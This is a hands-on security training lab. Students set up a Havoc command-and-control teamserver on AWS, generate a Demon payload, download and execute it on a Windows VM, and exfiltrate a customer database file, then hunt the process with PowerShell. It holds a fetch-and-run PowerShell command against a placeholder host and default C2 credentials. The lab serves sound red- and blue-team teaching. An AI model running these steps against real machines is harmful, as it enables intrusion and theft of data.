![image](/FilesForLabs/images/blueantisyphon.png)

# Havoc Framework

# Ubuntu VM, Windows VM & AWS Cloud

### The objective of this lab is to establish a modern Command & Control (C2) infrastructure using a cloud-based backend (AWS EC2). You will learn how to bypass network defenses, execute a payload on a compromised Windows machine, exfiltrate data using the Havoc UI, and ultimately hunt for the malicious process as a Blue Teamer.
---

>[!IMPORTANT]
>For this particular lab, you will be required to **have the two VM's in two separate tabs**. We will start on the *Windows VM*. 

---
## Documentation and scenario : 

**What is Havoc?**

Havoc is a modern and malleable post-exploitation command and control framework created by @C5pider. It is widely used by Red Teams to manage compromised machines, execute commands stealthily, and exfiltrate data.

**Core Capabilities of Havoc** :

   - *Malleable C2 Profiles* :  It allows operators to customize how the malware communicates with the server, making the malicious traffic look like normal web browsing (e.g., simulating Microsoft telemetry or regular HTTP requests).
   
   - *Client-Server Architecture* :  It separates the backend (**Teamserver**) from the user interface (**Client**). This allows multiple hackers to connect to the same campaign simultaneously.
   
   - *Advanced Payload Generation* :  Generates custom agents called "Demons" (.exe, .dll, or shellcode) that feature advanced evasion techniques like sleep obfuscation and indirect syscalls.

If you want to dive a bit deeper, check the [Havoc Official GitHub](https://github.com/HavocFramework/Havoc).

>[!NOTE]
> In the cybersecurity landscape, platforms like Havoc and Cobalt Strike are the gold standard for Red Team operations. **Attackers never host the C2 server on their own laptops.** Instead, they rent cheap cloud servers (VPS) to host the Teamserver, making it difficult for Blue Teams to track the attacker's true physical location.


**This exact scenario is what we are going to simulate.** 

### **SCENARIO** : 

 - In this lab, we are simulating a highly realistic Red Team operation. The architecture consists of three parts:
   1. **The Target:** The *Windows VM* represents a compromised machine inside a corporate network.
   2. **The Cloud Infrastructure:** An *AWS EC2 Instance* acts as the Teamserver. This is the "Mothership" that catches the data.
   3. **The Hacker's Terminal:** The *Ubuntu VM* is your local machine running the Havoc Client UI, remotely controlling the mothership.

 - To successfully steal sensitive data, **we will generate a Havoc Demon payload and configure it to communicate via HTTP/HTTPS with our AWS cloud server**.

 - **Why are we doing this?** By putting the backend in the cloud, we protect our true identity (the Ubuntu VM). The victim will only ever see connections going out to a public AWS IP address, which often blends in with legitimate corporate cloud traffic.

>[!IMPORTANT]
> **You** will act as both the Red Teamer and the victim. Pay close attention to which machine (Windows, Ubuntu, or AWS) you are executing commands on. For this particular lab you will need to have two tabs open : One for the **Ubuntu VM** and another for the **Windows VM**. All sensitive data meant to be exfiltrated is located in the **Lab Directory**.

---

## AWS Setup: 

Before we dive in to the actual Lab Exercise, we need an **AWS Free Tier Account**. If you don't have an AWS Account and want a step by step guide for the AWS Free Tier account, check out **Phase 1** of the [ScoutSuite Lab](/Decks/CORE_v3.1/IC/labs/scoutsuite.md). Start the **Ubuntu VM** only after you have your *AWS Account* set up.

>[!NOTE] 
>You will need a *Credit/Debit Card*, Amazon Web Services will withdraw $1 from your account and will hold it for 3-5 days, then return it in order to ensure you are a real person.

### Environment : Ubuntu VM

 - On the **Ubuntu VM**, go to the [AWS Webpage](https://aws.amazon.com) using **Firefox** and log into your **AWS Free Tier Account**. 

Once you have your AWS Account set up, let's get an **EC2 Instance** up and running. 

 - Log into the *AWS Management Console*, type **EC2** in the searchbar and click:
   
 <img width="1513" height="688" alt="image" src="https://github.com/user-attachments/assets/921d5f54-1293-40df-9ab0-1756729b6dbc" />

 - Click the orange **Launch Instance** button:

 <img width="1853" height="829" alt="image" src="https://github.com/user-attachments/assets/8fd81a2b-3d52-4ad6-a792-a361b11d848f" />
   
 - Give your instance a recognizable name, like `Havoc-Teamserver`:

 <img width="1203" height="319" alt="image" src="https://github.com/user-attachments/assets/91bd8187-af50-4ff2-a541-014b86c404d0" />
   
 - **Application and OS Images (Amazon Machine Image):** Select **Ubuntu** and make sure the *Ubuntu Server 22.04 LTS* (or newer) is selected. Ensure it has the "Free tier eligible" label.

 <img width="1102" height="662" alt="image" src="https://github.com/user-attachments/assets/70ec7158-fccb-4b1f-be27-1a293a78d69e" />

 - In the **instance type** tab, select`t3.small` (Free tier eligible). This wil give us *2gb* of ram to work with:

 <img width="889" height="623" alt="image" src="https://github.com/user-attachments/assets/24f55358-391b-4e37-97ac-3e6700f289d8" />

 
 - **Key pair (login):** You need this to SSH into your server in the next phase. 
   - Click **Create new key pair**: 
 <img width="1110" height="195" alt="image" src="https://github.com/user-attachments/assets/6ad1a62a-6d48-4ed0-a94d-ea1a144b55e2" />
   
   - Name it *havoc-key*;
     
   - Key pair type: **RSA**, Private key file format: **.pem**;
     
   - Click **Create key pair**. The file will automatically download to the *Downloads* section of the *Ubuntu VM*. **You MUST move it to your personal PC**;

 <img width="632" height="598" alt="image" src="https://github.com/user-attachments/assets/7882a4c9-a74c-4adc-94d1-e18ce7a92f24" />

>[!IMPORTANT]
> Once you recieve *havoc-key.pem*, **you NEED to move it to your personal computer**.
> If there is a network error, or the Ubuntu Vm idles too long and closes, **you risk losing the RSA Private Key, and therefore access to your AWS EC2 instance**. If that happens you need to **delete the key and reconfigure the AWS EC2**.

🔑 Securing the SSH Key (havoc-key.pem) : 
 - The *RSA Key* should be in your *Downloads* folder on the VM :
   
 <img width="859" height="304" alt="image" src="https://github.com/user-attachments/assets/45364ac4-85e5-4305-8cda-b470c38a09c4" />

   We will use the **VM's clipboard** to copy the .pem file. Move the *.pem* file to the **lab directory (~/BnB/Havoc)**
 - To *open or close* the clipboard of the VM press **ctrl+alt+shift** and a small window will pop up: 

 <img width="526" height="826" alt="image" src="https://github.com/user-attachments/assets/9ce6ed1f-9a0a-4e46-80a0-39d65c95b40d" />
 
 - Use **cat** and copy the contents of the file. Make sure to copy the **---BEGIN...---** and **---END...---** parts of the key. 

 <img width="808" height="694" alt="image" src="https://github.com/user-attachments/assets/d18635c4-679c-4088-be72-9c9a93ad2275" />

 - Copy the contents of the file using **ctrl+shift+c**, and you will see that when you open your clipboard, the contents of the file will be listed there : 

 <img width="524" height="662" alt="image" src="https://github.com/user-attachments/assets/f104722a-7ed5-417c-aa21-a6a8a83dd6d7" />

Use your cursor to **copy the contents of the VM clipboard with ctrl+a, then ctrl+c**, and paste them into a file on your personal machine. 
>[!NOTE]
>After creating the havoc-key.pem file on your host machine using the Copy-Paste method, you must set the correct file permissions. SSH clients are designed to ignore private keys that are "too readable" by other users on the system. If you skip this step, your connection will be rejected.

Depending on your operating system, this proccess will differ : 

### Option A: Linux / macOS Users

- On Linux / macOS, open a folder of your choosing in the terminal, type **nano havoc-key.pem**, paste the content into a the file, press **ctrl+o, Enter, then ctrl+x**. After that, type:

``` bash
chmod 400 havoc-key.pem
```

 - You should now see the that **only the root user has reading permission**: 

 <img width="551" height="23" alt="image" src="https://github.com/user-attachments/assets/a8407052-8dc2-4793-9a48-b127315db08d" />


### Option B: Windows Users (PowerShell)
Open a PowerShell terminal in the folder containing your key and run these two commands. This will disable permission inheritance and ensure only your current user profile has access:

```PowerShell
# 1. Disable permission inheritance
icacls "havoc-key.pem" /inheritance:r

# 2. Grant read access only to the current user
icacls "havoc-key.pem" /grant:r "${env:USERNAME}:R"6
```

⚠️ Important Security Note: 
 - These "Strict Permissions" ensure that you are the only one who can read this file. If you attempt to connect and see an error like Permissions 0644 for 'havoc-key.pem' are too open, it means the steps above were not completed successfully.

- **Now, moving on to *Network settings*:** This is the most important part. We need to open the specific ports Havoc uses. 
   - Next to Network settings, click **Edit**:
     
 <img width="1123" height="629" alt="image" src="https://github.com/user-attachments/assets/4f454119-28f7-430a-8795-1607c3af926a" />

   - Create a new security group and name it *Havoc-SG*:
     
 <img width="1114" height="612" alt="image" src="https://github.com/user-attachments/assets/eabfe645-2e9c-42a4-b180-2f1a3a183889" />

   You need to add the following **Inbound Security Group Rules**:

   - **Rule 1 (SSH):** Set *Source type: My IP*. This ensures that *only* you'll be able to connect to your EC2 from the **Ubuntu VM**: 

 <img width="1089" height="351" alt="image" src="https://github.com/user-attachments/assets/c89f73a2-6e79-4029-9874-39944055a583" />

   - **Rule 2 (Havoc Client):** Click "Add security group rule". Type: `Custom TCP`, Port range: `40056`, Source type: `My IP` (This allows your Ubuntu UI to connect to the backend):

 <img width="1112" height="330" alt="image" src="https://github.com/user-attachments/assets/3670a774-ab25-42f7-a109-f6fbee6284ee" />

   - **Rule 3 (Payload Traffic):** Click "Add security group rule". Type: `HTTP`, leave the port range: `80`, Source type: `My IP`. (This is how the compromised Windows machine will communicate with the Teamserver):

 <img width="1091" height="331" alt="image" src="https://github.com/user-attachments/assets/a59f2f8b-cae3-4038-a6d6-caa0e2eeb307" />

   - **Rule 4 (Secure Payload Traffic):** Click "Add security group rule". Type: `HTTPS`, Port range: `443`, Source type: `My IP`:
     
 <img width="1091" height="318" alt="image" src="https://github.com/user-attachments/assets/33a90388-c4c8-4925-8428-ddc3dfd1d70e" />

>[!IMPORTANT]
> Note that a real red teamer does not leave the source type **Anywhere**. Normally you would select either **My IP** or another **custom** setting.
> Also note that, in a real data exfiltration scenario, the source for the 80 / 443 (HTTP/HTTPS) ports is the **victim's IP**. For this lab, however, the VM's are linked, so you can just leave "My IP" everywhere.
> **DO NOT publish your .pem file or just leave the .pem file in one of the two VM's**. If the VM closes you lose acces to the *RSA Key* and have to start over.
> Once the lab is done **destroy the EC2 instance** so you do not get charged. 
 
 - **Configure storage:** The default 8 GB could be enough, but since we'll be downloading *golang dependencies* let's increase that to **20gb**. It does not increase the cost of running the *EC2 Instance* . 
 
 <img width="911" height="458" alt="image" src="https://github.com/user-attachments/assets/130063bd-d4f2-47a0-82ea-28bf67d09fea" />

 - Your **Summary** tab should look like this now : 

 <img width="907" height="537" alt="image" src="https://github.com/user-attachments/assets/e64c8cf6-11ca-4dac-ba27-99557f135ecf" />

 On the right-side summary panel, click **Launch instance**.
 - You wil be given an **Instance Number**. Click on it to find out the details about the AWS instance: 
 
 <img width="1380" height="182" alt="image" src="https://github.com/user-attachments/assets/658ba5fa-0d73-4b2f-a84f-815ca9e6eda5" />

 <img width="1104" height="448" alt="image" src="https://github.com/user-attachments/assets/f6a0aa3b-c806-44e5-81b4-e1b9b412aced" />

 - You will use this address to log into the AWS EC2. 
---
## Phase 1 : Setup and Objective
### Environment: Windows VM

We assume initial access to a *Windows 11* System, and our objective is to exfiltrate the sensitive financial databases without getting caught.

- First things first, open Windows PowerShell and navigate to the **Lab Directory**. Let's see the loot :

```bash 
cd Desktop\Labs\Havoc
ls
```

 <img width="820" height="302" alt="image" src="https://github.com/user-attachments/assets/5e62d876-cbe5-4e8a-a458-7052c0be192a" />

- Let's take a look at the **customer_database.csv** file. This is the "trophy" we are going to use **Havoc** to exfiltrate to our Cloud Teamserver:
  
 <img width="762" height="113" alt="image" src="https://github.com/user-attachments/assets/bfdb6d14-b0b0-427f-9d75-e9144b196450" />

---

## Phase 2: Staging the Cloud Infrastructure & Connecting the Command Center
### Environment: [Ubuntu VM] -> [AWS EC2]

As a professional attacker, you need to spin up your backend infrastructure before deploying malware. We will use the *Ubuntu VM* to connect to our AWS cloud and set up the "Mothership", then connect our local user interface to it.

>[!NOTE]
> If you have not yet moved the **.pem** file into the **Ubuntu VM**, now's the time.

- Step 1 (Connect to AWS): On your *Ubuntu VM*, open a terminal and locate the havoc-key.pem file you saved earlier. SSH into your AWS EC2 instance (replace <YOUR_AWS_PUBLIC_IP> with your actual EC2 IP):

```bash
ssh -i "havoc-key.pem" ubuntu@<YOUR_AWS_PUBLIC_IP>
```

 - Step 2 (Build and Start Teamserver): You are now inside the AWS EC2 Shell. Since this is a fresh Ubuntu server, we must install the necessary build tools and dependencies before compiling Havoc.

```bash
# Install dependencies
sudo apt update
sudo apt install -y git build-essential musl-dev
sudo add-apt-repository ppa:longsleep/golang-backports -y
sudo apt update
sudo apt install -y golang-go

# Clone the repo and build the teamserver
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
make ts-build

# Start the Teamserver
./havoc server --profile ./profiles/havoc.yaotl -v
```

<img width="1238" height="542" alt="image" src="https://github.com/user-attachments/assets/f2ccc7fc-0b75-462c-b438-d879065677c1" />

>[!IMPORTANT]
> Leave this SSH terminal open so the Teamserver keeps running. Note down your AWS Public IP address, you will need it for the next step.


Once it's done building, you will see the Teamserver mention the **Custom TCP Port** from our AWS Machine: 

<img width="1067" height="564" alt="image" src="https://github.com/user-attachments/assets/e726cacd-5a77-4848-bbb0-a0fa5e19a73d" />

Step 3 (Start the Client): Open a NEW tab/terminal on your Ubuntu VM (do not close the SSH session). Move to the **Lab Directory**. Start the pre-installed Havoc Client:

``` bash
cd ~/BnB/Havoc
./Havoc
```

A login screen will appear. Fill in the connection details:

- Name : AWS_Teamserver (or any other suggestive name - it's not all that important)
- Host: <YOUR_AWS_PUBLIC_IP>
- Port: 40056
- User: 5pider (Default)
- Password: password1234 (Default)

<img width="561" height="326" alt="image" src="https://github.com/user-attachments/assets/d4a9313f-7ed8-40b0-9df7-e0369058f542" />

Once connected, you are inside the Havoc dashboard!

Create a Listener: Go to View -> Listeners -> Add. Give the listener a name. Set it to HTTP and input your AWS Public and Private IP in the 'Hosts' field. Click Save.
<img width="1335" height="454" alt="image" src="https://github.com/user-attachments/assets/07b68045-86f9-475a-a2c6-412997b1c810" />

<img width="1195" height="1029" alt="image" src="https://github.com/user-attachments/assets/3b49c7b2-459b-450f-98da-2aea919440d5" />

<img width="613" height="831" alt="image" src="https://github.com/user-attachments/assets/e2dcbab3-7ccf-4291-9a9a-5a0db746dcfa" />

Generate the Payload: Go to Attack -> Payload. Select your HTTP Listener, choose 'Windows' and 'Executable (.exe)'. Click Generate and save the *demon.x64.exe* file in the **lab directory (~/BnB/Havoc)**.

<img width="1854" height="1049" alt="image" src="https://github.com/user-attachments/assets/2187d663-8c58-4770-8c36-6eb3790766de" />


Start a quick Python web server on the Ubuntu VM to host the demon.x64.exe so the victim machine can download it (make sure you run this in the lab directory, where demon.x64.exe was saved) : 

```bash
cd ~/BnB/Havoc
python3 -m http.server 8000
```

<img width="685" height="88" alt="image" src="https://github.com/user-attachments/assets/1527e4e6-6011-495e-b8d5-2c01547ad6ca" />


## Phase 3: Payload Delivery & Exfiltration
### Environment: [Windows VM] (Victim) & [Ubuntu VM] (Attacker)

We now switch to the compromised *Windows VM* to deliver the payload and execute the attack.

- Download the Havoc Demon directly from our Ubuntu server. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**

```powershell
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8000/demon.x64.exe" -OutFile "$env:TEMP\demon.exe"
```

- Execute the payload:

```powershell
& "$env:TEMP\demon.exe"
```

- **Look back at your Ubuntu VM!** Within seconds, you should see a new active session pop up in the Havoc UI. The Windows machine has successfully "called home" to your AWS Teamserver.

<img width="1852" height="669" alt="image" src="https://github.com/user-attachments/assets/570bf194-c444-42c5-b435-0921cad9aa4d" />


- **Exfiltration:** Right-click the active session -> *Interact*. You now have a remote shell.
<img width="1146" height="387" alt="image" src="https://github.com/user-attachments/assets/406ab603-0ec0-4351-b7a7-f54d9970a759" />
- Use basic commands like `ls` and `cd` to navigate to `C:\Users\Administrator\Desktop\Labs\Havoc`: 
<img width="1480" height="669" alt="image" src="https://github.com/user-attachments/assets/00ade0b5-c5f9-4603-bc56-8178cf89aaf5" />

- Type the following command to exfiltrate the database:

```bash
download customer_database.csv
```

<img width="1314" height="672" alt="image" src="https://github.com/user-attachments/assets/4830a608-52da-4439-aced-d059e2f2c0ff" />


Once downloaded, you can find the file in your Havoc Loot module (View -> Loot).

<img width="1396" height="812" alt="image" src="https://github.com/user-attachments/assets/ce1efec8-ed65-4724-831e-07559c6909b0" />
<br></br>
<img width="1844" height="672" alt="image" src="https://github.com/user-attachments/assets/71186571-c72c-422c-872a-01fcffe067ae" />

 **Attack successful!** >:D

---

## Phase 4: Blue Team Detection
### Environment : Windows VM

The attacker used the cloud to hide their identity, but malware must still run on the endpoint. Let's hunt for the active C2 connection.

Open a NEW PowerShell terminal as Administrator on the Windows VM.

- Find the Active Connection. We are looking for unusual processes making outbound TCP connections to external IP addresses.

```PowerShell
Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
```

<img width="1152" height="500" alt="image" src="https://github.com/user-attachments/assets/dd759700-cdf6-411b-bbac-9621e712fe40" />


*Notice how the RemoteAddress points to our AWS Cloud IP, bypassing internal network suspicion.*

- Identify the Malicious Process. Take the OwningProcess ID (PID) from the connection above and let's see what program is running. (Replace `<PID>` with your specific number).

```PowerShell
Get-Process -Id <PID> | Select-Object Name, Path
```

<img width="917" height="193" alt="image" src="https://github.com/user-attachments/assets/5aa8d0ae-7c47-4679-82d3-846827d8418e" />


Analysis: Finding an unsigned executable named `demon.exe` running from the user's TEMP folder and communicating with an external cloud IP is a massive Indicator of Compromise (IoC).

**Use `Stop-Process -Id <PID> -Force` to kill the demon payload.**


---

### Cleanup

You're done! Let's clean up the environment to avoid unnecessary AWS charges and remove the malware.

 - **CRITICAL (AWS):** Go to your AWS EC2 Dashboard, right-click your instance, and select **Terminate instance**. If you only close the terminal, Amazon will continue billing you after your free tier limit is reached!

 <img width="1585" height="573" alt="image" src="https://github.com/user-attachments/assets/d87bfa69-3066-42d2-9179-d27ca778f8c5" />
 
 - On the Ubuntu VM: Close the Havoc Client and the Python web server.

---

### Conclusion
In this lab, you successfully built a professional-grade C2 infrastructure. You learned how Red Teams separate their UI from their backend using cloud services like AWS to obscure their origin. You successfully delivered a payload, interacted with a compromised machine via the Havoc dashboard, and exfiltrated data. As a Blue Teamer, you discovered that even with cloud-based obfuscation, endpoint forensics (looking at active processes and network connections) will always reveal the execution of malware. 

<br></br>

# Finished?

[Back to Card's Main Page](/Decks/CORE_v3.1/PER/New_User_Added.md)
